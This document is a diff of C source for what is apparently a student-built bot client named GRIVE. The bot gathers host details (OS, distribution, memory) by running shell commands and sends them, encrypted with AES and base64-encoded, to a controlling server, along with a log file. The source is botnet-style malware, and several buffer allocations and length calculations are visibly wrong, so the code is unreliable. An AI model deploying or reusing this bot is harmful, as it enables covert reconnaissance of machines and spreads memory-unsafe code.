@@ -17,7 +17,7 @@ char* log_editor(char *action, bool success){
     char* log;
     log = (char*) malloc(sizeof(char)* (strlen(action)+21));
     memset(log, 0, sizeof(log));
-    sprintf(log, "action: %s, success: %d", action, success);
+    sprintf(log, "action: %s, success: %d-", action, success);
     return log;
 }
 
@@ -27,9 +27,9 @@ void printLog(char* log){
     seconds = time(NULL);
     struct tm *ptm = localtime(&seconds);
 
-    FILE* logfile = fopen("/tmp/GRIVE_logfile.txt", "a");
+    FILE* logfile = fopen("/home/GRIVE_logfile.txt", "a");
     if(logfile != NULL)
-     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s \n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
+     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s\n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
            ptm->tm_min, ptm->tm_sec, log);
         fclose(logfile);
 
@@ -37,11 +37,17 @@ void printLog(char* log){
 // send_msg : function to send messages to the server: we only put the bot id at the begining
 
 bool send_msg(int sockfd, char* m, int BOT_ID){
-    char* msg;
-    msg = (char*) malloc(sizeof(char)* (strlen(m)+7));
-    sprintf(msg, "[%d] %s", BOT_ID, m);
-   // printf("%s\n", msg);
-    if (!send(sockfd, msg, strlen(msg), 0))
+   char* msg;
+   msg = (char*) malloc(sizeof(char)* (strlen(m)+7));
+   sprintf(msg, "[%d] %s", BOT_ID, m);
+   printf("%s\n", msg);
+    int len =  strlen(msg);
+    int enc_len = len/16;
+    if (len%16 != 0)
+     enc_len++;
+     enc_len = enc_len*24;
+   // compute the size of the encoded msg 
+     if (!send(sockfd, encrypt_encode( msg, strlen(msg)), enc_len, 0))
         return false;
     return true;
 }
@@ -55,64 +61,17 @@ bool send_log(int sockfd, char* log, int BOT_ID){
     sprintf(m, "log:%s\n", log);
 
     if(!send_msg(sockfd, m, BOT_ID)){
+        free(m);
         return false;
     }
+    free(m);
     return true;
 
 }
 
-bool secure_msg(){
 
-char* message= "grive envole toi";
-char* encoded="";
-char* decoded="";
-char plain[16]= "grive envole toi";
-
-        memset(plain, 0, 16);
-        AesContext context;
-
-        const uint8_t  key[16] ={0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};
-        uint8_t output [AES_BLOCK_SIZE];
-        memcpy(plain, message, 16);
-        //printf("%x", buffer[16])
-        printf("Plain : %s\n", message);
-        AesInitialise128(key, &context);
-        uint8_t* unsi_plain = (uint8_t*)plain;
-        AesEncrypt(&context, unsi_plain, output);
-        char* cipher = (char*) output;
-        printf("Cipher: %s\n", cipher);
-        encoded = base64_encode(cipher);
-        printf("%s\n", encoded);
-        decoded =  base64_decode(encoded);
-        printf("%s\n", decoded);
-        AesDecryptInPlace(&context, unsi_plain);
-        printf("Dipher: %s\n", (char *) unsi_plain);
-        printf("\n"); 
-        printf("\n");
-//encrypt the message
-// firts we will assume that the messahe is 16 bit lenght
-//
-
-
-}
-
-// collect the system information on aa temp file the send them to the bot
-void print_repo(char* log){
-
-    time_t seconds;
-    seconds = time(NULL);
-    struct tm *ptm = localtime(&seconds);
-
-    FILE* logfile = fopen("report.txt", "a");
-    if(logfile != NULL)
-     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s \n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
-           ptm->tm_min, ptm->tm_sec, log);
-        fclose(logfile);
-
-}
-
-bool system_info(int sockfd){
-
+bool system_info(int sockfd, int BOT_ID){
+  // collect the system information on a temp file then send them to the bot
   FILE *fp;
   char* path = (char*) malloc(50*sizeof(char));
 
@@ -126,7 +85,7 @@ bool system_info(int sockfd){
     return -1;
   }
   fgets(path,50*sizeof(char), fp);
-  send(sockfd, path, strlen(path), 0);
+  send_msg(sockfd, path, BOT_ID);
 // send the operationg system
   fp = popen("/bin/echo 'OS: ' $(uname);", "r");
   if (fp == NULL) {
@@ -135,16 +94,16 @@ bool system_info(int sockfd){
     return -1;
   }
   fgets(path,50*sizeof(char), fp);
-  send(sockfd, path, strlen(path), 0);
+  send_msg(sockfd, path, BOT_ID);
 // send the linux distribution name of the machine
-    fp = popen("/bin/grep ^ID= /etc/*-release ;", "r");
+    fp = popen("/bin/grep ^ID= /etc/os-release ;", "r");
   if (fp == NULL) {
     printf("Failed to run command\n" );
     exit(1);
     return -1;
   }
   fgets(path,50*sizeof(char), fp);
-  send(sockfd, path, strlen(path), 0);
+  send_msg(sockfd, path, BOT_ID);
 // send the total amount of ram memory
     fp = popen("/bin/grep MemTotal /proc/meminfo;", "r");
   if (fp == NULL) {
@@ -153,7 +112,7 @@ bool system_info(int sockfd){
     return -1;
   }
   fgets(path,50*sizeof(char), fp);
-  send(sockfd, path, strlen(path), 0);
+  send_msg(sockfd, path, BOT_ID);
 // send the free amount of ram memory
   fp = popen("/bin/grep MemFree /proc/meminfo;", "r");
   if (fp == NULL) {
@@ -162,8 +121,8 @@ bool system_info(int sockfd){
     return -1;
   }
     fgets(path, 50*sizeof(char), fp);
-  send(sockfd, path, strlen(path), 0);
-
+  send_msg(sockfd, path, BOT_ID);
+  free(path);
   /* close */
   pclose(fp);
 
@@ -176,7 +135,7 @@ bool report(int sockfd, int BOT_ID){
     char * line = NULL;
     size_t len = 0;
     ssize_t read;
-    fp = fopen("report.txt", "r");
+    fp = fopen("/home/GRIVE_logfile.txt", "r");
     if (fp == NULL)
         return 0;
 
@@ -186,7 +145,6 @@ bool report(int sockfd, int BOT_ID){
     fclose(fp);
     if (line)
     free(line);
-    remove("report.txt");
     return 1;
 
 }
